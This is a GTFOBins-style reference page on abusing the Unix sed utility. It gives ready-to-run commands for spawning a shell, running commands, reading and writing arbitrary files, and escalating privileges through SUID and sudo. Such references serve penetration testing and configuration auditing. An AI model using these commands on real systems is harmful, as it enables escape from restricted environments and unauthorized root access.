# GTFOBin: sed

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

GNU version only. Also, this requires `bash`.

```
sed -n '1e exec sh 1>&0' /etc/hosts
```

GNU version only. The resulting shell is not a proper TTY shell.

```
sed e
```

## Command

It can be used to break out from restricted environments by running non-interactive system commands.

GNU version only.

```
sed -n '1e id' /etc/hosts
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

```
LFILE=file_to_write
sed -n "1s/.*/DATA/w $LFILE" /etc/hosts
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

```
LFILE=file_to_read
sed '' "$LFILE"
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

```
sudo install -m =xs $(which sed) .

LFILE=file_to_read
./sed -e '' "$LFILE"
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

GNU version only. Also, this requires `bash`.

```
sudo sed -n '1e exec sh 1>&0' /etc/hosts
```